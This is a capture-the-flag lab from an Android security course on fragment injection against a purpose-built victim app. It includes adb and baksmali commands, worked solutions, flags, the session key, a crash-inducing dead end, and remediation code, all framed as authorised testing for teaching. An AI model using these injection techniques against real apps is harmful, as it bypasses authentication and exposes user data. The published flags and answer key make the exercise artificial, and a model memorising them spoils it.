# Lab 05 — CTF: The Understudy's Understudy

> **Difficulty:** CTF
> **Time:** 2–4 hours
> **You will need:** a device or emulator you own, `adb`, the apps from
> [`../examples/`](../examples/build.sh), Python 3, and `dexdump` or `baksmali`.
> **Prerequisite:** labs [01](lab-01-land-the-injection.md) and
> [03](lab-03-beyond-preferenceactivity.md). Lab 02 is optional; lab 04 is not needed.

---

## The brief

You are assessing `com.pentest.ch31.victim`, on a device you own. You have the APK and an ordinary
application uid. You have **no root, no Frida, and no permissions**.

There are **two flags**, and they are not the same difficulty:

```
Stage 1   CH31{...}      rendered by a screen the app puts behind a PIN
Stage 2   CH31{...}      held by a screen NOTHING in the app ever constructs
```

Stage 1 you have already done, in lab 01, and it is here so that the chain is complete.

Stage 2 is the CTF. It has three properties that make it more than a repeat:

- the Fragment that holds it is **reachable by no code path in the application at all**;
- it will not release the flag unless it is handed a value it believes only the app's own code
  could know;
- **that value appears in no log**. It is rendered on the victim's screen and nowhere else — which
  is [README §5.7](../README.md)'s honest limit, turned into a puzzle.

There is also one **deliberate dead end**. It looks like the intended route, it is the route most
people take first, and it will crash the target. Recognising *why* it crashes is worth as much as
the flag.

> **⚠️ Authorised testing only**
> Everything here targets `../examples/victim-app/` on a device you own. The attacker app requests
> zero permissions and hard-codes the victim's package.

---

## Rules

1. **No root. No Frida. No `adb shell am start` against the victim.** Every Intent that reaches the
   victim must originate from `com.pentest.ch31.attacker`, which runs as an ordinary app uid. You may
   use `adb shell am start` to start the *attacker*.
2. **No editing the victim.** You may read its APK all you like.
3. `adb shell` may be used for **observation** — `logcat`, `dumpsys`, `uiautomator dump`, screenshots.
   Note as you go which observations an attacker application could also make; that question comes
   back in the debrief.
4. Every claim in your write-up must be backed by output you can paste.

---

## Setup

```bash
# host
cd ../examples && ./build.sh --install
adb shell am start -n com.pentest.ch31.victim/.MainActivity     # seeds the vault; do this once
adb shell "dumpsys trust" | grep -o "deviceLocked=[01]"          # expect 0
```

---

## Stage 0 — Reconnaissance

Establish what an ordinary app can see, from an ordinary app:

```bash
# host
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack probe
adb logcat -d -s CH31ATK
```

<details>
<summary>Hint 0.1 — how many entry points are there really?</summary>

Five exported Activities and one internal. Write them down. Then ask the question the manifest cannot
answer: **which of the five accepts something that becomes a type?**

</details>

<details>
<summary>Hint 0.2 — you have the APK; use it</summary>

```bash
adb shell pm path com.pentest.ch31.victim
adb pull <path> /tmp/ctf.apk
python3 -B ../scripts/fragment-injection-scan.py /tmp/ctf.apk --verbose
```

The scanner will name one method at tier 1 and three classes at tier 2. One of the three tier 2
entries is the dead end.

</details>

---

## Stage 1 — The screen behind the PIN

Goal: make the victim display `AdminFragment` without typing the PIN, and record flag 1.

<details>
<summary>Hint 1.1</summary>

`SettingsActivity` extends `android.preference.PreferenceActivity`. That class reads an Intent extra
whose literal value is `:android:show_fragment` and instantiates the class it names.

</details>

<details>
<summary>Hint 1.2</summary>

```bash
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack pref-inject
adb logcat -d -s CH31
```

</details>

<details>
<summary>Solution — stage 1</summary>

```
I CH31: SettingsActivity.onCreate showFragment=com.pentest.ch31.victim.AdminFragment
I CH31: isValidFragment(com.pentest.ch31.victim.AdminFragment) -> true (VULNERABLE)
W CH31: ADMIN-FRAGMENT-REACHED secret=CH31{fragment_injection_skipped_the_login_screen}
```

**Flag 1:** `CH31{fragment_injection_skipped_the_login_screen}`

</details>

---

## Stage 2 — The deliberate dead end

Before continuing, try the route that looks obviously better.

`SettingsHardenedActivity` is exported, has almost the same name, and — if you decompiled it — has a
real allowlist. It is natural to try it, if only to confirm the control.

```bash
# host
adb shell am force-stop com.pentest.ch31.victim
adb logcat -c
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack pref-hardened
sleep 3
adb logcat -d | grep -E "FATAL|IllegalArgumentException|switchToHeaderInner" | head -6
```

The victim **crashes**. An "app keeps stopping" dialog appears. Nothing is injected.

**Stop and answer three questions before moving on. They are worth more than the flag.**

<details>
<summary>Q1 — Why does a WORKING control crash the app?</summary>

Because the platform's refusal path is a throw, not a return. `PreferenceActivity.switchToHeaderInner`
does:

```
000a: invoke-virtual isValidFragment(...)Z
000e: if-eqz v0, 004a
...
004a: new-instance v0, Ljava/lang/IllegalArgumentException;
0051: const-string v2, "Invalid fragment for this activity: "
0062: throw v0
```

The exception leaves `onCreate` and nothing catches it. The allowlist did its job; the app died
anyway.

</details>

<details>
<summary>Q2 — Is the crash a finding?</summary>

Yes, and a different one from the injection. Any installed application can kill the host on demand,
with no permission, repeatably. It is not data disclosure, so it is not High — Low to Medium is
defensible — and the remediation is **not** "override `isValidFragment`", because returning `false`
produces exactly this crash. The complete fix is to stop extending `PreferenceActivity`.
[README §5.4](../README.md).

</details>

<details>
<summary>Q3 — Why is this a dead end for the CTF specifically?</summary>

Because a crash destroys the process, and everything you need for stage 2 is **on the screen of a
live victim process**. The route that stops the injection also stops you observing anything. Note
which of your tools depend on the target staying alive; that is a general lesson about DoS-adjacent
primitives during an assessment.

</details>

---

## Stage 3 — Find the Fragment nothing constructs

Somewhere in the victim there is a Fragment that no Activity adds, no navigation reaches, and no menu
mentions. Find it.

<details>
<summary>Hint 3.1 — enumerate Fragment subclasses from the DEX</summary>

```bash
# host
mkdir -p /tmp/ctf && cd /tmp/ctf
python3 -B -c "
import zipfile; z=zipfile.ZipFile('/tmp/ctf.apk')
open('classes.dex','wb').write(z.read('classes.dex'))"
java -cp /path/to/apktool.jar com.android.tools.smali.baksmali.Main d classes.dex -o out/
grep -rln 'super Landroid/app/\(Dialog\)\?Fragment;' out/com/pentest/ch31/victim/ 2>/dev/null || \
grep -rn '\.super Landroid/app/' out/com/pentest/ch31/victim/
```

Or, without baksmali, with `dexdump`:

```bash
$ANDROID_HOME/build-tools/35.0.1/dexdump classes.dex | grep -B2 "Superclass.*Fragment"
```

</details>

<details>
<summary>Hint 3.2 — which of them is never referenced?</summary>

A class that is constructed somewhere will appear as a `new-instance` or in a `const-class`. One will
not:

```bash
# host
for f in AdminFragment PublicFragment VaultFragment; do
  printf '%-16s new-instance: %s   const-class: %s\n' "$f" \
    "$(grep -rc "new-instance .*$f;" out/ | awk -F: '{s+=$2} END{print s+0}')" \
    "$(grep -rc "const-class .*$f;" out/ | awk -F: '{s+=$2} END{print s+0}')"
done
```

</details>

<details>
<summary>Hint 3.3 — read it</summary>

`VaultFragment` is a `DialogFragment`. It reads `getArguments().getString("unlock")` and compares it
against a constant. Find the constant's **name**; you will not find its value usefully by reading the
Smali alone, because the point of stage 4 is where it lives at runtime.

</details>

---

## Stage 4 — Get the key out of a live process

`VaultFragment` wants a value that the developer assumed only the app's own code could know. It is a
compile-time constant, so a determined reverse engineer can lift it out of the string pool — and you
should notice that, because it is a real weakness in the challenge and in the design it models.

**Do it the other way first**, because that way teaches the thing this chapter is actually about.

<details>
<summary>Hint 4.1 — where does the value appear at runtime?</summary>

Nowhere in `logcat`. Grep for it and you will find only your own commands.

`AdminFragment` renders it **on the screen**. Inject `AdminFragment` (stage 1), then look.

</details>

<details>
<summary>Hint 4.2 — read the screen</summary>

```bash
# host
adb shell am force-stop com.pentest.ch31.victim
adb shell am start -n com.pentest.ch31.victim/.MainActivity ; sleep 2
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack pref-inject ; sleep 3
adb shell uiautomator dump /sdcard/ui.xml
adb shell cat /sdcard/ui.xml | tr '>' '\n' | grep -o 'text="[^"]\{3,\}"'
adb shell rm -f /sdcard/ui.xml
```

</details>

<details>
<summary>Solution — stage 4</summary>

```
text="ADMIN PANEL&#10;&#10;secret: CH31{fragment_injection_skipped_the_login_screen}&#10;&#10;
      session key: understudy-2f41&#10;&#10;If you are seeing this without having typed the PIN,
      the login screen was skipped."
```

**Session key:** `understudy-2f41`

</details>

> **⚠️ Warning — be honest about the vantage of this step**
> `uiautomator dump` runs as `shell` (uid 2000). **An ordinary application cannot do it.** An app
> could get the same value with an accessibility service (a permission the user must grant through
> Settings), a screen-capture projection (a consent dialog), or by being a human looking at the
> phone. So step 4, as performed, is **instrumentation**, not an attack step.
>
> That is not a flaw in the lab; it is the lab's most important point. [README §5.7](../README.md):
> an injected Fragment makes the **victim display** something. It does not hand it to the attacker.
> Reporting fragment injection as "data theft" without identifying the return path is the most common
> over-claim in this bug class, and you have just walked into the gap deliberately.
>
> Write into your report which steps used shell instrumentation and which an app could genuinely
> perform. That distinction is the difference between a credible finding and an inflated one.

---

## Stage 5 — Land the second injection

Now inject `VaultFragment` **with arguments**.

<details>
<summary>Hint 5.1 — which host?</summary>

The `PreferenceActivity` route carries arguments in `:android:show_fragment_args`; the reflective host
carries them in `args`. Either works. The attacker app's `ctf` mode uses the reflective host, and
takes the unlock value from the Intent that starts the attacker, so nothing is baked in.

</details>

<details>
<summary>Hint 5.2 — you cannot build a nested Bundle with `am`</summary>

`am start --es` puts strings into the *attacker's* Intent. Building a `Bundle` **inside** another
Intent's extras needs code, which is why the attacker app does it for you. This is worth remembering
in real work: a nested-`Bundle` payload is a small program, not a command line.

</details>

<details>
<summary>Solution — stage 5</summary>

```bash
# host
adb shell am force-stop com.pentest.ch31.victim
adb logcat -c
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity \
    --es attack ctf --es unlock understudy-2f41
sleep 3
adb logcat -d -s CH31
```

```
I CH31: FragmentHostActivity.onCreate name=com.pentest.ch31.victim.VaultFragment mode=null
I CH31: VaultFragment: unlock=<supplied> accepted=true
W CH31: VAULT-FRAGMENT-UNLOCKED CH31{arguments_are_attacker_input_too}
```

**Flag 2:** `CH31{arguments_are_attacker_input_too}`

Run the control as well, because a CTF answer with no control is the same mistake as a report with no
control:

```bash
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack ctf --es unlock wrong
```

```
I CH31: VaultFragment: unlock=<supplied> accepted=false
```

The comparison is real. What failed was the assumption about **who could supply the value**.

</details>

---

## Debrief

Answer these in your write-up. They are the assessment, not the flags.

### 1. Name every primitive in the chain

<details>
<summary>Model answer</summary>

| # | Primitive | Where |
|---|---|---|
| 1 | An exported Activity reachable by any app with no permission | `SettingsActivity`, `FragmentHostActivity` |
| 2 | A reflective loader driven by a string from outside the app | `isValidFragment` returning `true`; `Fragment.instantiate` |
| 3 | A Fragment reachable that no code path constructs | `VaultFragment` — "unreachable" was never a property of the class |
| 4 | An arguments `Bundle` that arrives from the caller | `getArguments()` treated as trusted input |
| 5 | A secret that only exists on the victim's screen | the exfiltration gap, and the reason step 4 needed instrumentation |

</details>

### 2. Which step is the actual vulnerability?

<details>
<summary>Model answer</summary>

Number 2. Everything else is a consequence.

Number 1 is normal and correct — apps export Activities on purpose. Number 3 is not a defect at all;
a Fragment that nothing constructs is dead code, and it only becomes reachable because of 2. Number 4
is how every Fragment in the world is written. Number 5 is a limit on the impact, not a cause.

Remove 2 and the chain has no second link.

</details>

### 3. Rate both flags separately

<details>
<summary>Model answer</summary>

**Flag 1 — High.** No permission, no root, no user interaction, and it bypasses an authentication
screen. Precondition is only "an app on the device", and the same sink is reachable from a browsable
deep link, which removes even that.

**Flag 2 — depends entirely on how the key is obtained.** If the only route is instrumentation, the
chain is not demonstrable by an app alone and you should say so; the honest finding is *"injection
plus attacker-controlled arguments lets a stranger drive an internal screen"*, rated on the injection.
If the key is a constant recoverable from the APK — which it is here — then it is not a secret at
all, and the finding becomes *"a hard-coded value is used as an authorisation token"*, which is its
own well-known defect and is rated on what it protects.

Both readings are defensible. What is not defensible is presenting the chain as a remote data-theft
exploit.

</details>

### 4. Write the remediation as code

<details>
<summary>Model answer</summary>

Three changes, in order of value:

```java
// 1. Delete the primitive: accept a key, not a type name.
private Fragment create(String screen) {
    if (screen == null) return new PublicFragment();
    switch (screen) {
        case "about": return new PublicFragment();
        default:      return null;                 // refused, logged, finish()
    }
}
```

```java
// 2. Stop extending PreferenceActivity. An allowlist stops the injection and
//    leaves any app able to crash the host, because the refusal is a throw.
//    androidx.preference has no Activity that loads a Fragment from an Intent.
```

```java
// 3. Check in the destination as well, because routes multiply.
@Override public void onCreate(Bundle b) {
    super.onCreate(b);
    if (!Session.isAuthenticated()) {
        getFragmentManager().beginTransaction().remove(this).commitAllowingStateLoss();
        getActivity().finish();
    }
}
```

And a fourth that is not code: **stop treating a compile-time constant as a secret.** A value in the
string pool is public.

</details>

### 5. What would you have missed with a manifest-only review?

<details>
<summary>Model answer</summary>

Everything. The manifest lists six Activities and no Fragments, because Fragments are not components.
It cannot distinguish `SettingsActivity` from `SettingsHardenedActivity`, which differ by one method
body. It says nothing about `VaultFragment` existing, let alone being reachable.

A manifest audit ([32-Manifest](../../32-Manifest/README.md)) produces the **candidate hosts**, and
that is genuinely necessary — you would not have known which five Activities to look at without it.
The finding comes from the DEX. [README §6.5](../README.md).

</details>

---

## Success criteria

- [ ] Both flags, with the command and output that produced each.
- [ ] The dead end reproduced, with the stack trace, **and** the three questions answered.
- [ ] `VaultFragment` identified as unreferenced, with the `new-instance` / `const-class` counts that
      prove it.
- [ ] The session key obtained from the screen, with an explicit note that this step used shell
      instrumentation.
- [ ] The wrong-key control run and its output.
- [ ] Both flags rated separately, with the reasoning about the exfiltration gap.
- [ ] Remediation written as code.

---

## Instructor notes

<details>
<summary>Open only if you are running this for someone else</summary>

**Flags**

```
Stage 1: CH31{fragment_injection_skipped_the_login_screen}
Stage 2: CH31{arguments_are_attacker_input_too}
Session key: understudy-2f41
```

**The dead end is load-bearing.** Most participants try `pref-hardened` within the first ten minutes
because the class name looks like the "real" target. The crash is instructive and the recovery is
trivial (`am start` the victim again), so it costs nothing but teaches the §5.4 lesson before they
read §5.4.

**Where people get stuck, in order of frequency:**

1. They grep `logcat` for the session key, find nothing, and conclude the key is generated at
   runtime. Nudge: *"where does an injected Fragment put its output?"*
2. They try to build the nested `Bundle` with `am start --es`. Nudge: *"can a command line express a
   Bundle inside an Intent's extras?"*
3. They forget `-S` and re-read stale output. Nudge them to the `filterEquals` note in lab 01.
4. They find `understudy-2f41` in the string pool immediately and skip stage 4. **That is a correct
   solve** — accept it, then ask them to also do it the intended way and to explain which of the two
   an app could perform. The comparison is the teaching.

**Timings from the reference run:** stage 1, ten minutes for anyone who did lab 01. Stage 3, thirty
to sixty minutes. Stage 4, the longest, because the instinct is to search logs. Stage 5, ten minutes.

**Do not let a participant finish without answering debrief question 3.** A CTF that ends with two
flag strings and no severity reasoning has taught a command, not a skill — and inflated severity is
this bug class's most common failure in the field.

</details>

---

## Clean up

```bash
# host
cd ../examples && ./build.sh --uninstall
rm -rf /tmp/ctf /tmp/ctf.apk
adb shell ls /sdcard/ui.xml 2>/dev/null      # expect "No such file"
```

---

## Where to go next

- [README §5.8](../README.md) for the honest-severity table this CTF's debrief is built on.
- [30-Activities lab 05](../../30-Activities/labs/lab-05-ctf-the-understudy.md), the CTF this one is
  named after, for the Activity-level version of the same skill.
- [43-WebView](../../43-WebView/README.md) if you want to see what an injected Fragment is worth when
  the Fragment it reaches hosts a `WebView`.
